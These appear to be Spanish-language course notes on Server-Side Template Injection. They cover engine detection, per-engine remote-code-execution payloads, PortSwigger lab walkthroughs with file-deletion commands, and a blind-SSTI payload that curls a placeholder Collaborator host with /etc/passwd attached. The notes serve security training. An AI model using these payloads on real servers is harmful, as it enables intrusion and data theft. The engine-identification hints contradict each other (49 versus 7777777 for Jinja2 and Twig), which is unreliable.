

> [!info] Relacionado con
> [[SSRF - Server-Side Request Forgery]] · [[Vulnerabilidades Web - OWASP Top 10 y Burp Suite]] · [[Burp Suite - Framework de Auditoría]] · [[OWASP Top 10 - CVE CVSS CWE]]

---

## ① Definición

**SSTI (Server-Side Template Injection)** = inyectar código en motores de plantillas del servidor, ejecutando código arbitrario del lado del servidor.

> [!important] SSTI es la escalada más directa a RCE
> A diferencia de otras inyecciones que dependen del contexto, SSTI te da **ejecución remota de código** (RCE) directamente. Si el servidor renderiza tu input en una plantilla, tienes control total.

### Plantilla y motor de plantillas

Ninguna web seria tiene el contenido *hardcodeado*: los textos se generan de forma **dinámica** con **plantillas** (formato fijo con variables rellenadas en ejecución). Ejemplo: `Hola {{ nombre }}` con `nombre = Carlos` → `Hola Carlos`.

**Motor ≠ lenguaje:** Ruby usa ERB, Python usa Tornado o Jinja2, Java usa FreeMarker, PHP usa Twig, Node.js usa Nunjucks, .NET usa Razor. Un mismo lenguaje puede tener varios motores; la sintaxis del payload depende del **motor**, no solo del lenguaje.

### Código seguro vs vulnerable

| Tipo | Código | Resultado |
|------|--------|-----------|
| **Seguro** | `render(template="hola {{nombre}}", nombre=entrada)` | Datos como parámetro separado |
| **Vulnerable** | `render(template="hola " + entrada)` | Entrada concatenada en el template |

> [!tip] La metáfora
> Es la diferencia entre darle a alguien **una receta con un ingrediente a rellenar** (seguro) y darle **la receta en blanco para que la escriba él entero** (vulnerable).

El SSTI aparece cuando un **dato controlado por el usuario** entra dentro del código de la plantilla y el motor lo **evalúa** en lugar de tratarlo como texto plano. La señal de partida: si un valor que **yo controlo** (nombre, empresa, comentario) **se refleja** en algún punto de la web, ahí hay potencial de SSTI.

> [!warning] Reflejo ≠ vulnerabilidad confirmada
> Que un valor se refleje NO garantiza que sea vulnerable: es un potencial SSTI. Hay que confirmarlo (7*7 → 49 o forzando error). No confundas con manipular el HTML en el F12: eso es solo frontend. En SSTI la petición llega al servidor, se procesa y vuelve reflejada.

> [!note] Analogía con SQL Injection
> SSTI se razona igual que un **SQL Injection**, pero abusamos de la **plantilla** en vez de la **consulta**: en SQLi cerramos la comilla antes de inyectar; en SSTI **cerramos la expresión** del motor antes de inyectar. Si el valor se refleja tal cual solemos tener más poder que en un SQLi típico (menos filtrado). El objetivo final habitual es el RCE.

---

## ② Detección

### Test básico (el famoso 49)

```
{{7*7}} → Si la respuesta es 49 → SSTI confirmado
{{7*'7'}} → Si es 49 o 7777777 → motor confirmado
<%= 7*7 %> → ERB
${7*7} → FreeMarker / Mako
```

> [!tip] Diferenciar de XSS
> Si ves el resultado `49` **renderizado** en la página, es SSTI. Si ves `{{7*7}}` como texto plano, no está procesando plantillas. Si ves una alerta de JavaScript, es XSS normal. El 49 es **confirmación de ejecución**, no el fin: interesa escalar de la operación matemática a `whoami`, lectura/escritura de ficheros o reverse shell.

### Cadena polyglot (navaja suiza)

```
${${<%[%'"}}%\
```

Una sola cadena que mezcla los caracteres especiales de todos los motores. Si el motor "entiende" alguno de sus caracteres, se rompe la sintaxis y **fuerza un error** que lo delata:

| Si desaparecen... | Motor |
|-------------------|-------|
| `<%` y `%>` | ERB (Ruby) |
| `{{` y `}}` | Tornado / Jinja2 / Twig |
| `${` y `}` | FreeMarker / Mako |

> [!tip] Analogía del profesor (Casa Paco)
> El motor solo "come" su propia sintaxis: si le das su plato lo procesa; si le metes un brócoli (caracteres ajenos) te lo escupe tal cual. Por eso el polyglot deja ver qué sintaxis pertenece a cada motor.

### Forzado de errores

Los **códigos de error son oro**. Muchas apps en preproducción dejan *stack traces* públicos que revelan lenguaje, motor y hasta **versión** (p. ej. Ruby 2.7.0, Python 2.7 + Tornado). Un error verboso ya es en sí una vulnerabilidad (fuga de información). Si no reconoces el motor, pega el error en Google/HackTricks o la IA.

### Árbol de decisión de detección

```
1. ¿Hay motor de plantillas? → inyectar 7*7 ({{ }} / ${ } / <%= %>)
   → ¿49? → SÍ → motor presente. ¿Texto literal? → NO SSTI (o probar otro motor)
2. ¿Qué motor es? → polyglot + {{7*'7'}} (49=Jinja2, 7777777=Twig) + forzar error
3. ¿Contexto de valor o de código? → ¿el backend envuelve mi input en {{ ... }}?
   → Contexto de código: CERRAR la expresión primero }}{{7*7}}
4. Explotar → payload del motor → whoami / RCE / escalada
```

> [!warning] Identificar ANTES de explotar
> Usar el payload de Jinja2 en Twig da error sin resultado y puede alertar al sistema. Primero identificar, luego explotar. No asumas el motor por el lenguaje del backend (PHP no garantiza Twig).

---

## ③ Identificación del motor

| Payload | Motor |
|---------|-------|
| `{{7*7}}` → 49 | Jinja2 (Python), Twig (PHP), Tornado (Python), Nunjucks (Node.js) |
| `${7*7}` → 49 | Freemarker (Java), Mako (Python) |
| `<%= 7*7 %>` → 49 | ERB (Ruby) |
| `#{7*7}` → 49 | Slim (Ruby) |
| `@(7*7)` → 49 | Razor (.NET) |
| `{{7*7}}` restringido | Django (valida bien, limita objetos internos) |

### Diferenciar Jinja2 vs Twig vs Freemarker

```
{{7*'7'}} → 49 → Jinja2 (string repeat) — no, en Jinja2 es repetición de string → 7777777
{{7*'7'}} → 7777777 → Jinja2 (Python) / Tornado
{{7*'7'}} → 49 → Twig (concatenación numérica)
${7*7} → error en {{ }} motores → FreeMarker / Mako
```

| Prueba | Jinja2 (Python) | Twig (PHP) | Freemarker (Java) |
|--------|-----------------|------------|-------------------|
| `{{7*7}}` | `49` | `49` | Error |
| `{{7*'7'}}` | `7777777` | `49` | Error |
| `${7*7}` | Error | Error | `49` |

> [!warning] Motores restringidos (Django)
> Django está más restringido por diseño: valida bien y limita la lectura de objetos y atributos internos, por lo que normalmente no se salta con el 7*7. Aun así, si se consigue la `SECRET_KEY` del framework, se puede comprometer todo.

> [!warning] No adivinar: probar
> Siempre enviar payloads de ambos motores y ver cuál responde. No asumas el motor por el lenguaje del backend (PHP no garantiza Twig).

### Vías de identificación (de menos a más ruido)

1. **Cadena polyglot** — qué caracteres "se come" el motor.
2. **`{{7*7}}` genérico** o variante por motor.
3. **Fuzzing con SecLists (lista SSTI) en Burp Intruder** — comparar por status code o longitud de respuesta.
4. **Forzar un error** — revela lenguaje/motor/versión.
5. **Pistas de Nmap** — servidor Python → acotar a Tornado/Jinja2/Mako.

---

## ④ RCE por motor

### Jinja2 (Python)

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Cadena del payload:**
1. `config` → objeto de configuración de la app
2. `.__class__` → su clase
3. `.__init__` → método de inicialización
4. `.__globals__` → variables globales del módulo
5. `['os']` → módulo `os` de Python
6. `popen('id')` → ejecuta el comando `id`
7. `.read()` → lee el resultado

### Jinja2 sin config (traversing jerarquía)

```python
''.__class__.__mro__[1].__subclasses__()
```

1. `''` → string vacío (cualquier objeto)
2. `.__class__` → su clase (str)
3. `.__mro__[1]` → clase base `object`
4. `.__subclasses__()` → **todas** las subclases disponibles

Se busca `subprocess.Popen` en esa lista y se invoca con el comando deseado. **El índice varía** entre entornos: hay que iterar o mirarlo en PayloadsAllTheThings. La cadena varía entre versiones de Python: no hay un payload universal.

### Tornado (Python) — contexto de código

```python
}}{% import os %}{{ os.system('whoami') }}
```

- `{% import os %}` → sintaxis de **bloque** de Tornado (importa `os` si no está importado)
- `{{ os.system(...) }}` → sintaxis de **expresión**
- Output `0` significa éxito (código de retorno). `true` en Ruby = éxito.

> [!warning] Errores frecuentes en Tornado
> (1) `os` puede no estar importado → importarlo en el payload; (2) una expresión vacía `{{ }}` da error `empty expression`: siempre debe contener un valor válido; (3) los espacios hay que URL-encodearlos o quitarlos.

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

**¿Qué hace?**
1. `<#assign ex=...>` → asigna una instancia de `Execute` a la variable `ex`
2. `?new()` → crea la instancia
3. `${ex("id")}` → ejecuta el comando `id`

> [!important] Relevancia laboral de FreeMarker
> FreeMarker aparece frecuentemente en aplicaciones Java de **banca y sector público en España**. Conocer este payload tiene valor directo en el mercado laboral.

### ERB (Ruby)

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

`system(...)` devuelve `true` si el comando se ejecuta correctamente. También vale lectura de ficheros con `File.open` (mini path traversal sin RCE).

> [!tip] PayloadsAllTheThings y HackTricks
> Ten listas completas de payloads por motor. No los memorices: entiende la **cadena de acceso a objetos** que cada motor expone. En las certificaciones básicas (eJPT) con lo visto basta; los labs avanzados exigen programación (objetos, métodos).

> [!warning] Filtros y límites de longitud
> Aunque 7*7→49 funcione, la explotación puede bloquearse: filtros que vetan `import`, `system`, `os` o rutas concretas; o límites de longitud del campo (nombre de empresa de 30 caracteres, fecha de nacimiento). Habrá que bypassear con Burp.

> [!note] En laboratorio autorizado: un `whoami` que responde YA es RCE
> En una auditoría real no necesitas una shell perfecta: en cuanto obtienes ejecución, ya es vulnerabilidad. La calidad de la shell es secundaria. Escalada posterior: reverse shell, lectura de ficheros, `SECRET_KEY` del framework, intento de escapar de sandbox/Docker (pivoting, tema avanzado).

---

## ⑤ Contexto de valor vs contexto de código

| Contexto | Ejemplo backend | Inyección |
|----------|-----------------|-----------|
| **Valor** (Lab 1 ERB) | Mensaje `out-of-stock` reflejado tal cual, sin llaves envolventes | Borro el valor original e inyecto directamente `<%= 7*7 %>` |
| **Código** (Lab 2 Tornado) | El backend envuelve: `{{ user.name }}` | **Cierro** la expresión del servidor y abro la mía |

### Contexto de código: cerrar primero

```
# Backend: {{ user.name }}  (nosotros solo vemos user.name)

# INCORRECTO (expresión dentro de expresión → sintaxis inválida)
{{ {{ 7*7 }} }}

# CORRECTO (enfoque genérico: cierro la del servidor y abro la mía)
}}{{7*7}}

# Enfoque limitado del lab (solo si sabemos que no hay más tras)
7*7
```

> [!important] El paralelismo con SQL Injection
> Igual que se cierra la consulta con una comilla (`admin' or 1=1`), aquí se cierra el bloque de plantilla con `}}` antes de inyectar el propio. En un entorno real no sabemos cómo es la expresión completa, por eso el enfoque de cerrar+abrir es más robusto.

> [!warning] No metas expresión dentro de expresión sin pensar
> Si el servidor ya pone `{{ }}`, meter `{{7*7}}` completo rompe. Cierra la del back end y abre la tuya para un payload genérico y fiable.

---

## ⑥ Blind SSTI

Cuando no ves el output directamente (sin renderizado), o la expresión evaluada no aparece ni en HTML visible ni en código fuente.

### Detección con Collaborator

```
{{config.__class__.__init__.__globals__['os'].popen('curl http://YOUR-COLLAB.burpcollaborator.net').read()}}
```

1. Crear Collaborator
2. Inyectar payload con HTTP request al Collaborator
3. Si aparece hit → SSTI confirmado aunque no veas el output

### Exfiltración out-of-band

```python
{{config.__class__.__init__.__globals__['os'].popen('curl http://COLLABORATOR/?dato=' + open('/etc/passwd').read()).read()}}
```

El payload ejecuta un comando que hace `curl` a la URL del Collaborator y mete el dato leído como parámetro.

> [!warning] No confiarse: inspeccionar el código fuente
> Si la expresión inyectada aparece dentro de un `<script>` en el HTML (no en texto visible), la vulnerabilidad es la misma pero hay que inspeccionar el **código fuente** de la respuesta. Si no ves el resultado en la página, no asumas que no hay SSTI.

---

## ⑦ Contexto de error y salida en código

- **Forzar error** → stack trace revela tecnología (Python 2.7, Tornado application…). Pega el error en buscador/IA y confirma motor. Vale hasta para OSCP.
- **Salida en `<script>`** → el payload y la técnica son idénticos; solo cambia dónde miras el reflejo.

---

## ⑧ Labs cubiertos (walkthroughs)

| Lab | Motor | Desafío |
|-----|-------|---------|
| **Lab 1 — ERB básico** | ERB (Ruby) | Contexto de valor: polyglot → `<%`/`%>` comidos → `<%=7*7%>` → 49 → RCE borra fichero |
| **Lab 2 — Tornado** | Tornado (Python) | Contexto de código: error revela Python+Tornado → cerrar `}}` → `{% import os %}` |
| **Jinja2 básico** | Jinja2 | SSTI directo con `{{7*7}}` → payload `config.__class__...` |
| **Jinja2 sin config** | Jinja2 | Sin `config` → `''.__class__.__mro__[1].__subclasses__()` |
| **FreeMarker** | FreeMarker | `<#assign ex=...Execute?new()>` → banca/sector público |
| **Code output** | Varios | Output dentro de `<script>` → inspeccionar fuente |

### Lab 1 — SSTI básico en ERB (Ruby) · contexto de valor

**Objetivo:** eliminar `morale.txt` del directorio personal de Carlos (verificar el nombre en el enunciado: a veces se transcribe "Morales.txt").

1. **Metodología primero:** no ir directo al SSTI; entender la app (tienda con producto con/sin stock).
2. **Burp Intruder:** enumerar IDs (1–20), comparar longitudes → en stock (200) vs sin stock (302 + mensaje reflejado en `message`).
3. El producto sin stock devuelve un mensaje que se **refleja** en el parámetro `message` de la URL → punto de inyección.
4. Inyectar polyglot → el motor consume `<%`/`%>` → **ERB (Ruby)**.
5. Confirmar con `<%= 7*7 %>` → 49.
6. RCE: `<%= system("rm /home/carlos/morale.txt") %>` → web muestra `true` → lab resuelto.

Como no hay expresión envolvente, **borro el valor original e inyecto directamente**. Un compañero lo resolvió con otra sintaxis ERB (objetos/funciones): también válida, el motor la interpreta igual.

### Lab 2 — SSTI en Tornado (Python) · contexto de código

**Escenario:** blog con login (`wiener`/`peter`). *My account* permite cambiar el **preferred name** (`blog-post-author-display`) que se refleja como autor en comentarios/posts.

1. Comentar sin loguear → nombre sale `anonymous`; hay que estar logueado y comentar en **nuestro** post (no se cambia el display de Daisy/Andy).
2. **Detectar el motor** interceptando el POST: si metemos algo que rompa la expresión, el app **peta** y el error revela **Python 2.7 + Tornado**.
3. `{{7*7}}` no sale limpio (sale con llaves) porque el input **ya vive dentro de una expresión** → contexto de código.
4. **Cerrar y abrir:** `}}{% import os %}{{ os.system('rm /home/carlos/morale.txt') }}`.
5. URL-encodear (Ctrl+U desde el `=` del parámetro; espacio → `+`) y **Follow redirect** en Repeater o el lab no marca resuelto.

> [!error] Errores típicos de compañeros en este lab
> No URL-encodear (el `%` de `{% %}` y los espacios rompen la petición). No hacer **Follow redirect** → "Congratulation" no aparece. Meter `{{7*7}}` sin cerrar primero. Copiar payloads del compañero (instancias distintas).

### HTB GoodGames (referencia)

Combinación real de **SQL Injection + SSTI en dos fases encadenadas** — aparece cuando ya dominas ambos bloques.

> [!note] PortSwigger Web Security Academy
> Practica todos los labs de SSTI. Son el mejor recurso para entender la escalada desde detección hasta RCE completo. También: labs de polyglot y Jinja2 sandbox.

---

## ⑨ SSTI vs otras inyecciones

| Inyección | Input | Output | Impacto |
|-----------|-------|--------|---------|
| **Path Traversal** | Rutas de ficheros | Lectura de archivos | Lectura de ficheros locales |
| **XXE** | Entidades XML | Datos de ficheros / SSRF | Lectura archivos, SSRF |
| **SQLi** | Consultas SQL | Datos de BD | Lectura/escritura de datos |
| **XSS** | JavaScript | HTML en navegador | Robo de cookies, sesión |
| **SSRF** | URLs | Acceso a red interna | Paneles internos, metadata cloud |
| **Command Injection** | Comandos OS | Salida del sistema | RCE, pero más filtrado |
| **SSTI** | Template code | Código ejecutado en servidor | **RCE completo** |

> [!important] Diferencia clave
> SSTI es **más peligrosa que XSS** porque ejecuta en el servidor, no en el navegador. Y es **más fácil que Command Injection** porque los motores de plantillas están diseñados para ejecutar código. De todas las inyecciones, SSTI es la que lleva **directamente a RCE** sin pasar por otras fases.

---

## ⑩ Las 3 fases de SSTI (flowchart)

```
1. DETECTAR → reflejo de input → inyectar {{7*7}} / polyglot → ¿49?
 ↓
2. IDENTIFICAR MOTOR → ¿qué caracteres desaparecen? → forzar error → HackTricks
 ↓
3. EXPLOTAR → sintaxis específica del motor → id / whoami → RCE
 ↓
4. ESCALAR → reverse shell, lectura ficheros, SECRET_KEY, sandbox escape
```

> [!quote] Frase clave de la sesión (Castillo)
> *"Igual que cierras la consulta con una comilla antes de inyectar `or 1=1`, en SSTI cierra el bloque de plantilla con `}}` antes de inyectar tu payload."*

> [!warning] Metodología primero
> No vayas directo a "buscar el SSTI": primero entiende la aplicación y saca todas las funcionalidades. La vulnerabilidad aparece después, sobre lo que ya has mapeado. Un campo puede parecer SSTI y ser command injection (Casa Paco): **prueba primero lo simple**.

---

## ⑪ Herramientas

| Herramienta | Objetivo |
|------------|----------|
| **Burp Suite (Repeater)** | Enviar payloads SSTI, analizar respuestas, **Follow redirect** |
| **Burp Intruder** | Enumerar IDs por longitud; fuzzing SSTI con SecLists |
| **Burp Decoder** | URL-encode (Ctrl+U) / decode (Ctrl+Shift+U); espacio → `+` |
| **Burp Collaborator** | Detección de Blind SSTI |
| **SecLists (lista SSTI)** | Diccionario de payloads para Intruder |
| **PayloadsAllTheThings** | Repo de payloads por motor de plantillas |
| **HackTricks** | Guías de SSTI y payloads actualizados (Ctrl+F por lenguaje) |
| **Wappalyzer / Nmap** | Fingerprint: pista de servidor Python → acotar motores |
| **IA (Claude/ChatGPT)** | Pegar stack trace → identificar tecnología/payload |

> [!note] Burp AI (mencionada en clase)
> PortSwigger anunció una IA que audita de forma autónoma dentro del proxy (beta pública: alcance, ruido, peticiones configurables). Equivalente conceptual a montar tu propio Burp + MCP/IA.

---

## Checklist de repaso

- [ ] ¿Sé explicar qué es SSTI y por qué es más peligrosa que XSS?
- [ ] ¿Distingo una plantilla de un motor de plantillas y motor de lenguaje?
- [ ] ¿Sé diferenciar código seguro (parámetro) de vulnerable (concatenación)?
- [ ] ¿Puedo detectar SSTI con el test `{{7*7}}` y el polyglot `${${<%[%'"}}%\`?
- [ ] ¿Distingo Jinja2 de Twig (`{{7*'7'}}`) y de FreeMarker (`${7*7}`)?
- [ ] ¿Tengo un payload de RCE para al menos un motor (Jinja2, ERB, Tornado, FreeMarker)?
- [ ] ¿Distingo contexto de valor de contexto de código y sé cerrar con `}}`?
- [ ] ¿Sé resolver el Lab ERB (directo) y el Lab Tornado (cerrar + `{% import os %}`)?
- [ ] ¿Sé detectar Blind SSTI con Collaborator y exfiltrar out-of-band?
- [ ] ¿Recuerdo URL-encodear en Burp y hacer Follow redirect?
- [ ] ¿Entiendo que un `whoami` que responde ya es RCE?
- [ ] ¿Mapeo la detección a las etapas de auditoría (análisis → explotación)?
- [ ] ¿He practicado los labs de PortSwigger y, si puedo, HTB GoodGames?









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Joselu/MODULO3/resumen_master_clase49.md|resumen_master_clase49]] — Netcat / Reverse Shells, SQL Injection, XXE
- [[../../apuntes Chema/OWASP Top 10, CVSS, CWE y CVE.md|OWASP Top 10, CVSS, CWE y CVE]] — SQL Injection, XSS, XXE
- [[../../apuntes Joselu/MODULO3/resumen_master_clase54.md|resumen_master_clase54]] — Netcat / Reverse Shells, SQL Injection, Testing
- [[../../apuntes Chema/SSTI - PortSwigger.md|SSTI - PortSwigger]] — Netcat / Reverse Shells, SQL Injection, XXE
- [[../../apuntes Joselu/MODULO3/resumen_master_clase55.md|resumen_master_clase55]] — Post-Explotacion, Seguridad, XXE

### 🌐 Cross-Dominio

- [[../../../programacion/Csharp/seguridad_csharp.md|seguridad_csharp]] — Programacion: Desarrollo Web, Seguridad, Testing
- [[../../../programacion/JavaScript/seguridad_javascript.md|seguridad_javascript]] — Programacion: Desarrollo Web, Seguridad, Testing

> #burpsuite #cli #command_injection #database #java #javascript #metasploit #netcat #post_explotacion #python #redes #seguridad #sql #sqli #ssrf #ssti #testing #web #wpscan #xss #xxe
